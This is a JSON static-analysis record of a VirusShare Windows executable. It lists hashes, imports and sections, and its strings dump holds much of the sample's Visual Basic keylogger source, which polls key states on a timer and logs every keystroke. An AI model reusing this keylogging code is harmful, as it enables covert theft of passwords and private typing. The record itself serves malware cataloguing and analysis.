{
    "docinfo": {},
    "filename": "VirusShare_0623ec033f1fdc00ef32f447e04d7411",
    "filesize": 36864,
    "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
    "hashes": {
        "md5": "0623ec033f1fdc00ef32f447e04d7411",
        "sha1": "aaf1f8ef07bc8695d2a237725693ac878b866848",
        "sha256": "dbd882318c849d23d73f9ab5e916880b832b753626ffc087c069fb856662fc19"
    },
    "peinfo": {
        "behavior": [
            "SEH__vba",
            "Xor"
        ],
        "breakpoint": [],
        "directories": {
            "debug": {},
            "export": [],
            "import": {
                "MSVBVM60.DLL": [
                    {
                        "function": "_CIcos",
                        "offset": 4198400
                    },
                    {
                        "function": "_adj_fptan",
                        "offset": 4198404
                    },
                    {
                        "function": "_adj_fdiv_m64",
                        "offset": 4198408
                    },
                    {
                        "function": "__vbaFreeObjList",
                        "offset": 4198412
                    },
                    {
                        "function": "_adj_fprem1",
                        "offset": 4198416
                    },
                    {
                        "function": "__vbaStrCat",
                        "offset": 4198420
                    },
                    {
                        "function": "__vbaHresultCheckObj",
                        "offset": 4198424
                    },
                    {
                        "function": "_adj_fdiv_m32",
                        "offset": 4198428
                    },
                    {
                        "function": "__vbaObjSet",
                        "offset": 4198432
                    },
                    {
                        "function": "_adj_fdiv_m16i",
                        "offset": 4198436
                    },
                    {
                        "function": "_adj_fdivr_m16i",
                        "offset": 4198440
                    },
                    {
                        "function": "_CIsin",
                        "offset": 4198444
                    },
                    {
                        "function": "__vbaChkstk",
                        "offset": 4198448
                    },
                    {
                        "function": "__vbaFileClose",
                        "offset": 4198452
                    },
                    {
                        "function": "EVENT_SINK_AddRef",
                        "offset": 4198456
                    },
                    {
                        "function": "_adj_fpatan",
                        "offset": 4198460
                    },
                    {
                        "function": "__vbaStrR8",
                        "offset": 4198464
                    },
                    {
                        "function": "EVENT_SINK_Release",
                        "offset": 4198468
                    },
                    {
                        "function": "_CIsqrt",
                        "offset": 4198472
                    },
                    {
                        "function": "EVENT_SINK_QueryInterface",
                        "offset": 4198476
                    },
                    {
                        "function": "__vbaExceptHandler",
                        "offset": 4198480
                    },
                    {
                        "function": "__vbaPrintFile",
                        "offset": 4198484
                    },
                    {
                        "function": "_adj_fprem",
                        "offset": 4198488
                    },
                    {
                        "function": "_adj_fdivr_m64",
                        "offset": 4198492
                    },
                    {
                        "function": "__vbaFPException",
                        "offset": 4198496
                    },
                    {
                        "function": "_CIlog",
                        "offset": 4198500
                    },
                    {
                        "function": "__vbaFileOpen",
                        "offset": 4198504
                    },
                    {
                        "function": "_adj_fdiv_m32i",
                        "offset": 4198508
                    },
                    {
                        "function": "_adj_fdivr_m32i",
                        "offset": 4198512
                    },
                    {
                        "function": "__vbaFreeStrList",
                        "offset": 4198516
                    },
                    {
                        "function": "_adj_fdivr_m32",
                        "offset": 4198520
                    },
                    {
                        "function": "_adj_fdiv_r",
                        "offset": 4198524
                    },
                    {
                        "function": "None",
                        "offset": 4198528
                    },
                    {
                        "function": "_CIatan",
                        "offset": 4198532
                    },
                    {
                        "function": "__vbaStrMove",
                        "offset": 4198536
                    },
                    {
                        "function": "_allmul",
                        "offset": 4198540
                    },
                    {
                        "function": "_CItan",
                        "offset": 4198544
                    },
                    {
                        "function": "_CIexp",
                        "offset": 4198548
                    },
                    {
                        "function": "__vbaFreeStr",
                        "offset": 4198552
                    },
                    {
                        "function": "__vbaFreeObj",
                        "offset": 4198556
                    },
                    {
                        "function": "None",
                        "offset": 4198560
                    }
                ]
            },
            "relocations": {
                "Size": 0,
                "VirtualAddress": 0,
                "count": 0,
                "details": {}
            },
            "resources": [
                {
                    "data": "b'(\\x00\\x00\\x00 \\x00\\x00\\x00@\\x00\\x00\\x00\\x01\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x80\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x80'",
                    "executable": false,
                    "language": "LANG_NEUTRAL",
                    "name": "RT_ICON_1",
                    "offset": 33916,
                    "size": 744,
                    "sublanguage": "SUBLANG_NEUTRAL"
                },
                {
                    "data": "b'(\\x00\\x00\\x00\\x10\\x00\\x00\\x00 \\x00\\x00\\x00\\x01\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x80'",
                    "executable": false,
                    "language": "LANG_NEUTRAL",
                    "name": "RT_ICON_2",
                    "offset": 33620,
                    "size": 296,
                    "sublanguage": "SUBLANG_NEUTRAL"
                },
                {
                    "data": "b'\\x00\\x00\\x01\\x00\\x02\\x00  \\x10\\x00\\x01\\x00\\x04\\x00\\xe8\\x02\\x00\\x001u\\x10\\x10\\x10\\x00\\x01\\x00\\x04\\x00(\\x01\\x00\\x002u\\x00\\x00'",
                    "executable": false,
                    "language": "LANG_NEUTRAL",
                    "name": "RT_GROUP_ICON",
                    "offset": 33584,
                    "size": 36,
                    "sublanguage": "SUBLANG_NEUTRAL"
                },
                {
                    "data": "b'\\x10\\x024\\x00\\x00\\x00V\\x00S\\x00_\\x00V\\x00E\\x00R\\x00S\\x00I\\x00O\\x00N\\x00_\\x00I\\x00N\\x00F\\x00O\\x00\\x00\\x00\\x00\\x00\\xbd\\x04\\xef\\xfe\\x00\\x00\\x01\\x00\\x00\\x00'",
                    "executable": false,
                    "language": "LANG_ENGLISH",
                    "name": "RT_VERSION",
                    "offset": 33056,
                    "size": 528,
                    "sublanguage": "SUBLANG_ENGLISH_US"
                }
            ],
            "sign": {},
            "tls": {
                "AddressOfCallBacks": 65535,
                "AddressOfIndex": 4,
                "Characteristics": 0,
                "EndAddressOfRawData": 3,
                "SizeOfZeroFill": 184,
                "StartAddressOfRawData": 9460301
            }
        },
        "dll": false,
        "entrypoint": 4568,
        "features": {
            "antidbg": [],
            "antivm": {},
            "crypto": [],
            "mutex": [],
            "packer": [
                "Microsoft_Visual_Basic_v50v60",
                "Microsoft_Visual_Basic_v50",
                "Microsoft_Visual_Basic_v50_v60",
                "Microsoft_Visual_Basic_v50_additional",
                "Microsoft_Visual_Basic_v50v60_additional"
            ],
            "xor": {}
        },
        "imagebase": 4194304,
        "imphash": "185354d0e3056ac46f6288e16e77978a",
        "metadata": {
            "CompanyName": "al-hafar",
            "FileVersion": "1.00",
            "InternalName": "\u0627\u0644\u0642\u0627\u062a\u0644",
            "OriginalFilename": "\u0627\u0644\u0642\u0627\u062a\u0644.exe",
            "ProductName": "Project1",
            "ProductVersion": "1.00"
        },
        "sections": {
            "count": 3,
            "details": [
                {
                    "characteristics": 1610612768,
                    "data": "b'l\\xa3\\x0ff\\x00[\\x0ff\\xc1S\\x0ff\\xc6e\\x02fHZ\\x0ff$",
                    "entropy": 5.2883162672958495,
                    "executable": true,
                    "hash": {
                        "md5": "2ed429780bad17633a8db0e239f6eef0",
                        "sha1": "fa9c99e9b8153d4ca06b3afb15ad3bdfce44b21f",
                        "sha256": "67e99b40bccb997aca8d90e129d89d922e52aca4e140c4c3c21a4eb4ca55972a"
                    },
                    "section_name": ".text",
                    "size_of_raw_data": 24576,
                    "virtual_address": 4096,
                    "virtual_size": 23184
                },
                {
                    "characteristics": 3221225536,
                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
                    "entropy": 0.0,
                    "executable": false,
                    "hash": {
                        "md5": "620f0b67a91f7f74151bc5be745b7110",
                        "sha1": "1ceaf73df40e531df3bfb26b4fb7cd95fb7bff1d",
                        "sha256": "ad7facb2586fc6e966c004d7d1d16b024f5805ff7cb47c7a85dabd8b48892ca7"
                    },
                    "section_name": ".data",
                    "size_of_raw_data": 4096,
                    "virtual_address": 28672,
                    "virtual_size": 2548
                },
                {
                    "characteristics": 1073741888,
                    "data": "b\"\\x00\\x00\\x00\\x00-:\\x8b>\\x00\\x00\\x00\\x00\\x00\\x00\\",
                    "entropy": 1.748701088116245,
                    "executable": false,
                    "hash": {
                        "md5": "49edbc3bbe02eec1d2f18b56bcd1ec30",
                        "sha1": "610c4f72ab0db61a5f72e2e6378092c518e18248",
                        "sha256": "a03298313ce398ae65c46d01f65b8da690104658746cd5287718e8cd8ef91872"
                    },
                    "section_name": ".rsrc",
                    "size_of_raw_data": 4096,
                    "virtual_address": 32768,
                    "virtual_size": 1892
                }
            ]
        },
        "timestamp": "2003-04-02 19:29:49"
    },
    "strings": {
        "dump": [
            "L!This program cannot be run in DOS mode.",
            "\ub5c8\ub5c8\ub5c8H\ub5c8\ub5c8\"\ub5c8Rich\ub5c8",
            ".text",
            "`.data",
            ".rsrc",
            "MSVBVM60.DLL",
            "zC$ofH\u025f|rI",
            " &H1) Project1",
            "1 = Tex",
            "rH`9e5B",
            "G@He*Q%b:O3f",
            "Form1",
            "Form1",
            "wwwwwwwwwwwwwp",
            "wwxwp",
            "wwwxwp",
            "wwwwwwwp",
            "wwww",
            "xwwww",
            "wwwwwwwwww",
            "wwwwwwwp",
            "wwwwwwp",
            "wwwwwwp",
            "wwwp",
            "wwwp",
            "wwwwwwwp",
            "wwwwwww",
            "xpxwp",
            "wpxwxpxp",
            "wwwwwwp",
            "Form1",
            "Text6",
            "  ate = Getasynckeystate(vbKeyRight)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[right]\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyUp)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[up]\"",
            "       ",
            "    KeyState = Getasynckeystate(vbKeyDown)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[down]\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyInsert)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[insert]\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyDelete)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[Delete]\"",
            "    ",
            "    KeyState = Getasynckeystate(&HBA)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \";\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \":\"",
            "         ",
            "    KeyState = Getasynckeystate(&HBB)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"=\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"+\"",
            "    ",
            "    KeyState = Getasynckeystate(&HBC)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \",\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"<\"",
            "    ",
            "    KeyState = Getasynckeystate(&HBD)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"-\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"_\"",
            "    ",
            "    KeyState = Getasynckeystate(&HBE)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \".\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \">\"",
            "    ' KeyLogger Software",
            "' Created by: Ramy M. (Egypt)",
            "' ramymb@maktoob.com",
            "Private Declare Function Getasynckeystate Lib \"user32\" Alias \"GetAsyncKeyState\" (ByVal VKEY As Long) As Integer",
            "Private Declare Function GetKeyState Lib \"user32\" (ByVal nVirtKey As Long) As Integer",
            "Private Const VK_CAPITAL = &H14",
            "Public Function CAPSLOCKON() As Boolean",
            "    Static IsInit As Boolean",
            "    Static IsOn As Boolean",
            "    If Not IsInit Then",
            "        While Getasynckeystate(VK_CAPITAL)",
            "        Wend",
            "        IsOn = GetKeyState(VK_CAPITAL)",
            "        IsInit = True",
            "    Else",
            "        If Getasynckeystate(VK_CAPITAL) Then",
            "        While Getasynckeystate(VK_CAPITAL)",
            "        DoEvents",
            "        Wend",
            "        IsOn = Not IsOn",
            "        End If",
            "    End If",
            "    CAPSLOCKON = IsOn",
            "End Function",
            "Private Sub Command2_Click()",
            "    Timer1.Enabled = False",
            "    Command1.Enabled = True",
            "    Command2.Enabled = False",
            "    Command3.Enabled = False",
            "End Sub",
            "Private Sub Command1_Click()",
            "    Timer1.Enabled = True",
            "    Command3.Enabled = True",
            "    Command2.Enabled = True",
            "    Command1.Enabled = False",
            "End Sub",
            "Private Sub Command3_Click()",
            "    End",
            "End Sub",
            "Private Sub Form_Load()",
            "End Sub",
            "Private Sub Timer1_Timer()",
            "    Dim KeyState As Long",
            "    Dim Shift As Long",
            "    Shift = Getasynckeystate(vbKeyShift)",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyA)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"A\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"a\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyB)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"B\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"b\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyC)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"C\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"c\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyD)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"D\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"d\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyE)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"E\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"e\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyF)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"F\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"f\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyG)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"G\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"g\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyH)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"H\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"h\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyI)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"I\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"i\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyJ)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"J\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"j\"",
            "    KeyState = Getasynckeystate(vbKeyK)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"K\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"k\"",
            "    KeyState = Getasynckeystate(vbKeyL)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"L\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"l\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyM)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"M\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"m\"",
            "    KeyState = Getasynckeystate(vbKeyN)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"N\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"n\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyO)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"O\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"o\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyP)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"P\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"p\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyQ)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"Q\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"q\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyR)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"R\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"r\"",
            "    KeyState = Getasynckeystate(vbKeyS)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"S\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"s\"",
            "    KeyState = Getasynckeystate(vbKeyT)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"T\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"t\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyU)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"U\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"u\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyV)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"V\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"v\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyW)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"W\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"w\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyX)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"X\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"x\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyY)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"Y\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"y\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyZ)",
            "    If (CAPSLOCKON = True And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = False And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"Z\"",
            "    If (CAPSLOCKON = False And Shift = 0 And (KeyState And &H1) = &H1) Or (CAPSLOCKON = True And Shift <> 0 And (KeyState And &H1) = &H1) Then Text1 = Text1 + \"z\"",
            "    KeyState = Getasynckeystate(vbKey1)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"1\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"!\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKey2)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"2\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"@\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKey3)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"3\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"#\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKey4)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"4\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"$\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKey5)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"5\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"%\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKey6)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"6\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"^\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKey7)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"7\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"&\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKey8)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"8\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"*\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKey9)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"9\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"(\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKey0)",
            "    If Shift = 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \"0\"",
            "    If Shift <> 0 And (KeyState And &H1) = &H1 Then Text1 = Text1 + \")\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyBack)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[backspace]\"",
            "    ",
            "    KeyState = Getasynckeystate(vbKeyTab)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[tab]\"",
            "       ",
            "    KeyState = Getasynckeystate(vbKeyReturn)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + vbCrLf",
            "       ",
            "    KeyState = Getasynckeystate(vbKeyShift)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[shift]\"",
            "       ",
            "    KeyState = Getasynckeystate(vbKeyControl)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[ctrl]\"",
            "       ",
            "    KeyState = Getasynckeystate(vbKeyMenu)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[alt]\"",
            "       ",
            "    KeyState = Getasynckeystate(vbKeyPause)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[pause]\"",
            "       ",
            "    KeyState = Getasynckeystate(vbKeyEscape)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[esc]\"",
            "       ",
            "    KeyState = Getasynckeystate(vbKeySpace)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \" \"",
            "       ",
            "    KeyState = Getasynckeystate(vbKeyEnd)",
            "    If (KeyState And &H1) = &H1 Then Text1 = Text1 + \"[end]\"",
            "Timer3",
            "Timer2",
            "Text5",
            "Timer1",
            "Text4",
            ".exe",
            "Text3",
            "Text2",
            "Text1",
            "rH`9e5B",
            "VB5!",
            "Project1",
            "Project1",
            "K]zA",
            "Form1",
            "Project1",
            "G@He*Q%b",
            "K?B!",
            "rH`9e5B",
            "jU:O3f",
            "`\u04d3Form",
            "+3qD:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB",
            "*O3f",
            "`\u04d3Timer1",
            "Timer2",
            "Timer3",
            "`\u04d3Text6",
            "Text1",
            "Text2",
            "Text3",
            "Text5",
            "Text4",
            "VBA6.DLL",
            "__vbaStrR8",
            "__vbaFileClose",
            "__vbaPrintFile",
            "__vbaFreeObj",
            "__vbaFreeStr",
            "__vbaFileOpen",
            "__vbaFreeObjList",
            "__vbaFreeStrList",
            "__vbaHresultCheckObj",
            "__vbaStrCat",
            "__vbaStrMove",
            "__vbaObjSet",
            "`SVWeE",
            "3V]]]]\u0709]\u0609]\u0509]\u0409]\u0309]\u0209]\u0109]]",
            "PEP\u05cb",
            "UPR\u05cbMQW",
            "hXZ@",
            "hXZ@",
            "hXZ@",
            "hXZ@",
            "EUM5",
            ":PQ\u058b\u040dM",
            "UPR\u058b\u040dM",
